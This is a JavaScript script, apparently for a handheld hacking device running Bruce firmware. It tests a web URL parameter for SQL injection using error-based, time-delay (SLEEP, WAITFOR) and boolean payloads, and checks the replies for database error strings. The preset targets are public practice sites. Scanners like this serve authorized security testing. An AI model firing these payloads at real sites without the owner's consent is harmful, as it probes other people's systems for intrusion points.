// ============================================================================
//  SQLi Tester  -  Bruce / LilyGO T-Embed CC1101
//  Authorized testing of YOUR OWN web servers only.
// ----------------------------------------------------------------------------
//  Injects into the PARAMETER value of the URL you give (e.g. /page.php?id=1)
//  and runs 3 detection methods over a clean baseline request:
//    - error-based : a DB error string appears that wasn't in the baseline
//    - time-based  : a SLEEP/WAITFOR payload makes the response ~3s slower
//    - boolean     : "AND 1=1" vs "AND 1=2" give clearly different responses
//  BJS has no raw socket and no encodeURIComponent -> HTTP-only + manual encode.
//  Same picto UI as LAN Scanner.
// ============================================================================

// --- UI toolkit -------------------------------------------------------------
function C(r,g,b){ return display.color(r,g,b); }
var CW=C(255,255,255), CG=C(0,255,90), CR=C(255,70,70),
    CY=C(255,200,0),   CB=C(80,160,255), CGY=C(140,140,140);
function W(){ return display.width(); }
function H(){ return display.height(); }
function clear(){ display.fill(C(0,0,0)); }
function at(x,y,t,col){ display.setTextColor(col); display.drawString(""+t, x, y); }
function header(t){
  clear();
  display.setTextSize(2); at(6,4,t,CB);
  display.setTextSize(1); display.drawFastHLine(0,26,W(),CGY);
}
function esc(){ return keyboard.getEscPress() || keyboard.getSelPress(); }
function purgeKeys(){ for (var i=0;i<6;i++){ keyboard.getAnyPress(); delay(8); } }

// --- graphics / pictos ------------------------------------------------------
function magnifier(x,y,col){
  display.drawCircle(x,y,7,col); display.drawCircle(x,y,6,col);
  display.drawWideLine(x+5,y+5,x+11,y+11,3,col);
}
function radar(cx,cy,r,ang,col){
  display.drawCircle(cx,cy,r,CGY); display.drawCircle(cx,cy,Math.round(r*0.62),CGY);
  display.drawFastHLine(cx-r,cy,2*r,CGY); display.drawFastVLine(cx,cy-r,2*r,CGY);
  display.drawWideLine(cx,cy,cx+Math.round(r*Math.cos(ang)),cy+Math.round(r*Math.sin(ang)),2,col);
  display.drawFillCircle(cx,cy,2,col);
}
function checkIcon(cx,cy,s,col){
  display.drawWideLine(cx-s,cy,cx-Math.round(s*0.25),cy+s,4,col);
  display.drawWideLine(cx-Math.round(s*0.25),cy+s,cx+s,cy-s,4,col);
}
function icoVuln(x,y,col){                 // filled alert -> vulnerable
  display.drawFillTriangle(x+6,y, x,y+12, x+12,y+12, col);
  display.drawFastVLine(x+6,y+4,4,C(0,0,0)); display.drawPixel(x+6,y+10,C(0,0,0));
}
function icoWarn(x,y,col){                  // hollow triangle -> warning
  display.drawTriangle(x+6,y, x,y+12, x+12,y+12, col);
  display.drawFastVLine(x+6,y+4,4,col); display.drawPixel(x+6,y+10,col);
}
function icoInfo(x,y,col){
  display.drawCircle(x+6,y+6,5,col); display.drawPixel(x+6,y+3,col);
  display.drawFastVLine(x+6,y+5,4,col);
}
function icoScan(x,y,col){
  display.drawCircle(x+5,y+5,4,col); display.drawWideLine(x+8,y+8,x+12,y+12,2,col);
}
function icoQuit(x,y,col){
  display.drawCircle(x+6,y+7,5,col); display.drawFastVLine(x+6,y+1,6,col);
}
function icoEdit(x,y,col){                   // keyboard -> manual entry
  display.drawRoundRect(x,y+3,13,8,2,col);
  display.drawPixel(x+3,y+6,col); display.drawPixel(x+6,y+6,col); display.drawPixel(x+9,y+6,col);
  display.drawFastHLine(x+4,y+8,5,col);
}
function icoTarget(x,y,col){                 // crosshair -> preset target
  display.drawCircle(x+6,y+6,5,col);
  display.drawFastHLine(x+1,y+6,10,col); display.drawFastVLine(x+6,y+1,10,col);
}
function drawIcon(kind,x,y,col){
  if (kind==="vuln") icoVuln(x,y,col);
  else if (kind==="warn") icoWarn(x,y,col);
  else if (kind==="info") icoInfo(x,y,col);
  else if (kind==="scan") icoScan(x,y,col);
  else if (kind==="quit") icoQuit(x,y,col);
  else if (kind==="edit") icoEdit(x,y,col);
  else if (kind==="target") icoTarget(x,y,col);
}
function splashScreen(){
  clear(); var cx=Math.round(W()/2);
  radar(cx,52,30,0.9,CG);
  display.setTextSize(2); var t="SQLi TESTER"; at(cx-t.length*6,94,t,CB);
  display.setTextSize(1); at(cx-58,118,"authorized testing only",CGY);
  delay(1100);
}

// --- scrollable results (flicker-free, with pictos) -------------------------
function showResults(title, subtitle, rows){
  var LH=15, top0=44, per=Math.floor((H()-top0-12)/LH); if (per<1) per=1;
  var max=Math.max(0,rows.length-per), top=0, dirty=true;
  purgeKeys();
  while (true){
    if (dirty){
      header(title); at(6,30,subtitle,CB);
      for (var i=0;i<per;i++){
        var idx=top+i, y=top0+i*LH; if (idx>=rows.length) break;
        var r=rows[idx]; drawIcon(r.ic,6,y,r.col); at(26,y+2,r.s,r.col);
      }
      if (rows.length>per){
        var trackH=per*LH, barH=Math.max(10,Math.round(trackH*per/rows.length));
        var barY=top0+Math.round((trackH-barH)*(max?top/max:0));
        display.drawFastVLine(W()-5,top0,trackH,CGY); display.drawFillRect(W()-6,barY,4,barH,CB);
      }
      at(6,H()-11,"rotate=scroll   OK/ESC=back",CGY); dirty=false;
    }
    if (keyboard.getPrevPress()){ if (top>0){ top--; dirty=true; } }
    else if (keyboard.getNextPress()){ if (top<max){ top++; dirty=true; } }
    else if (keyboard.getEscPress()||keyboard.getSelPress()){ break; }
    delay(40);
  }
}

// --- selectable menu --------------------------------------------------------
function pickList(title, subtitle, rows, startSel, hint){
  var LH=15, top0=44; hint=hint||"rotate=move  OK=select  ESC=quit";
  var per=Math.floor((H()-top0-12)/LH); if (per<1) per=1;
  var sel=startSel||0; if (sel>=rows.length) sel=0;
  var top=Math.max(0,Math.min(sel,rows.length-per)), dirty=true;
  purgeKeys();
  while (true){
    if (dirty){
      header(title); at(6,30,subtitle,CB);
      for (var i=0;i<per;i++){
        var idx=top+i, y=top0+i*LH; if (idx>=rows.length) break;
        var r=rows[idx];
        if (idx===sel){ display.drawFillRoundRect(2,y-1,W()-11,LH-1,2,CB);
          drawIcon(r.ic,6,y,C(0,0,0)); at(26,y+2,r.s,C(0,0,0)); }
        else { drawIcon(r.ic,6,y,r.col); at(26,y+2,r.s,r.col); }
      }
      at(6,H()-11,hint,CGY); dirty=false;
    }
    if (keyboard.getPrevPress()){ if (sel>0){ sel--; if (sel<top) top=sel; dirty=true; } }
    else if (keyboard.getNextPress()){ if (sel<rows.length-1){ sel++; if (sel>=top+per) top=sel-per+1; dirty=true; } }
    else if (keyboard.getSelPress()){ return sel; }
    else if (keyboard.getEscPress()){ return -1; }
    delay(40);
  }
}

// --- live progress frame ----------------------------------------------------
function progressFrame(phase, detail, cur, total, hits, step){
  header("SQLi Test"); magnifier(18,42,CY);
  at(34,36,phase,CY); at(34,52,"testing...",CGY);
  radar(W()-38,66,26,step*0.7,CG);
  at(6,74,(""+detail).substring(0,32),CW);
  var y0=H()-34; display.drawRoundRect(6,y0,W()-12,12,3,CGY);
  var w=Math.round((W()-16)*cur/total); if (w>0) display.drawFillRect(8,y0+2,w,8,CB);
  at(6,y0+16,cur+"/"+total,CGY);
  display.drawFillCircle(W()-72,y0+20,4,hits>0?CR:CGY);
  at(W()-64,y0+16,"hits "+hits,hits>0?CR:CGY);
}

// --- helpers ----------------------------------------------------------------
function urlenc(s){                         // no encodeURIComponent in BJS
  var out="", hex="0123456789ABCDEF";
  for (var i=0;i<s.length;i++){
    var c=s.charCodeAt(i);
    if ((c>=48&&c<=57)||(c>=65&&c<=90)||(c>=97&&c<=122)||c===45||c===95||c===46||c===126)
      out+=s.charAt(i);
    else out+="%"+hex.charAt((c>>4)&15)+hex.charAt(c&15);
  }
  return out;
}
function fetchInfo(u){
  var t0=Date.now();
  try {
    var r=wifi.httpFetch(u); var b=""+(r.body||"");
    return { ok:true, status:r.status, low:b.toLowerCase(), len:b.length, ms:Date.now()-t0 };
  } catch(e){ return { ok:false, err:(""+e).toLowerCase(), ms:Date.now()-t0 }; }
}
// push the exact test URL into the report, wrapped over several rows
function pushUrl(rows, url){
  rows.push({ ic:"info", s:"test URL:", col:CGY });
  var u=""+url, LWc=44;
  while (u.length>0){ rows.push({ ic:"none", s:u.substring(0,LWc), col:CB }); u=u.substring(LWc); }
}

// --- detection config -------------------------------------------------------
var SQL_ERRORS=[
  "sql syntax","you have an error in your sql","warning: mysql","mysql_fetch",
  "mysqli","supplied argument is not a valid mysql","unclosed quotation",
  "quoted string not properly terminated","pg_query","postgresql","psql:",
  "sqlite","sqlite3","odbc","native client","microsoft ole db","ora-0",
  "ora-01756","pdoexception","division by zero","query failed","unterminated",
  "incorrect syntax near"
];
var ERR_PAYLOADS =["'","\"","')","';-- -","\") OR (\"1\"=\"1"];
var TIME_PAYLOADS=["' OR SLEEP(3)-- -","1) OR SLEEP(3)-- -","'; WAITFOR DELAY '0:0:3'-- -"];
function newSqlError(baseLow, low){
  for (var i=0;i<SQL_ERRORS.length;i++){
    var s=SQL_ERRORS[i];
    if (low.indexOf(s)!==-1 && baseLow.indexOf(s)===-1) return s;
  }
  return null;
}

// --- target list (loaded from sqli_targets.txt, else built-in) --------------
var DEFAULTS=[
  { label:"testasp id",     url:"http://testasp.vulnweb.com/showthread.asp?id=1" },
  { label:"testaspnet news",url:"http://testaspnet.vulnweb.com/ReadNews.aspx?id=1" },
  { label:"vulnweb cat",    url:"http://testphp.vulnweb.com/listproducts.php?cat=1" }
];
function loadTargets(){
  var paths=["/sqli_targets.txt","/scripts/sqli_targets.txt","/BruceJS/sqli_targets.txt"];
  var txt=null;
  for (var i=0;i<paths.length;i++){ try { txt=storage.read(paths[i]); if (txt) break; } catch(e){} }
  var list=[];
  if (txt){
    var lines=(""+txt).split("\n");
    for (var j=0;j<lines.length;j++){
      var ln=lines[j].replace(/\r/g,"").replace(/^\s+|\s+$/g,"");
      if (!ln || ln.charAt(0)==="#") continue;
      var bar=ln.indexOf("|"), url, label;
      if (bar>=0){ label=ln.substring(0,bar).replace(/\s+$/,""); url=ln.substring(bar+1).replace(/^\s+/,""); }
      else { url=ln; label=ln; }
      if (url.indexOf("http")===0) list.push({ label:label, url:url });
    }
  }
  return list.length ? list : DEFAULTS;
}
// menu: pick a preset target or type a URL. returns a full URL or null.
function pickTarget(){
  var list=loadTargets(), rows=[];
  for (var i=0;i<list.length;i++) rows.push({ ic:"target", s:list[i].label, col:CW, url:list[i].url });
  rows.push({ ic:"edit", s:"Enter URL manually...", col:CY, url:null });
  var sel=pickList("Targets", "pick a test target", rows, 0, "rotate=move  OK=select  ESC=back");
  if (sel<0) return null;
  if (rows[sel].url) return rows[sel].url;
  var u=keyboard.keyboard("http://192.168.1.", 60, "Full URL ?param=val");  // arg1 = prefill
  return (u && u.indexOf("http")===0) ? u : null;
}

// --- the scan ---------------------------------------------------------------
function runScan(base){
  var rows=[], hits=0, step=0;
  var total=1+ERR_PAYLOADS.length+TIME_PAYLOADS.length+1;
  purgeKeys();

  progressFrame("baseline", base, ++step, total, hits, step);
  var bl=fetchInfo(base);
  if (!bl.ok){
    showResults("SQLi report", base.substring(0,44), [
      { ic:"warn", s:"Baseline request failed", col:CY },
      { ic:"info", s:bl.err.substring(0,40), col:CGY },
      { ic:"info", s:"check IP / port / path", col:CGY }
    ]);
    return;
  }
  rows.push({ ic:"info", s:"baseline HTTP "+bl.status+" "+bl.len+"b "+bl.ms+"ms", col:CGY });

  // 1) error-based
  for (var i=0;i<ERR_PAYLOADS.length;i++){
    var p=ERR_PAYLOADS[i];
    progressFrame("error-based", p, ++step, total, hits, step);
    var r=fetchInfo(base+urlenc(p));
    if (r.ok){
      var sig=newSqlError(bl.low, r.low);
      if (sig){ hits++; rows.push({ ic:"vuln", s:"ERROR "+p, col:CR });
                rows.push({ ic:"info", s:"leak: "+sig, col:CGY });
                pushUrl(rows, base+urlenc(p)); }
    }
  }
  // 2) time-based blind
  var floor=Math.max(bl.ms,400)+2200;
  for (var j=0;j<TIME_PAYLOADS.length;j++){
    var tp=TIME_PAYLOADS[j];
    progressFrame("time-blind", tp, ++step, total, hits, step);
    var tr=fetchInfo(base+urlenc(tp));
    if (tr.ms>=floor){ hits++; rows.push({ ic:"vuln", s:"TIME-BLIND "+tr.ms+"ms", col:CR });
                       pushUrl(rows, base+urlenc(tp)); }
  }
  // 3) boolean-based
  progressFrame("boolean", "1=1 vs 1=2", ++step, total, hits, step);
  var rt=fetchInfo(base+urlenc(" AND 1=1-- -"));
  var rf=fetchInfo(base+urlenc(" AND 1=2-- -"));
  if (rt.ok && rf.ok && (rt.status!==rf.status || Math.abs(rt.len-rf.len)>40)){
    hits++; rows.push({ ic:"vuln", s:"BOOLEAN st "+rt.status+"/"+rf.status, col:CR });
            rows.push({ ic:"info", s:"len "+rt.len+" vs "+rf.len, col:CGY });
            pushUrl(rows, base+urlenc(" AND 1=1-- -"));
  }

  checkIcon(Math.round(W()/2),56,20, hits>0?CR:CG);
  display.setTextSize(2);
  var msg=hits>0 ? (hits+" hit"+(hits>1?"s":"")) : "clean";
  at(Math.round(W()/2)-msg.length*6,92,msg,hits>0?CR:CG);
  display.setTextSize(1); delay(900);

  if (hits===0) rows.push({ ic:"warn", s:"No SQLi detected here", col:CY });
  showResults(hits>0?"VULNERABLE":"SQLi report", base.substring(0,44), rows);
}

// --- main -------------------------------------------------------------------
function main(){
  splashScreen();
  if (!wifi.connected()){
    header("SQLi"); at(6,40,"Connecting Wi-Fi...",CW);
    wifi.connectDialog();
    if (!wifi.connected()){ dialog.error("SQLi","Wi-Fi not connected"); return; }
  }
  var menu=[
    { ic:"scan", s:"Scan a target", col:CW },
    { ic:"quit", s:"Quit",          col:CW }
  ];
  var msel=0;
  while (true){
    msel=pickList("SQLi TESTER","authorized targets only",menu,msel,"rotate=move  OK=select  ESC=quit");
    if (msel<0 || msel===1) return;

    var url=pickTarget();                   // preset from sqli_targets.txt, or manual
    if (url) runScan(url);                   // payloads are appended to the value
  }
}

main();
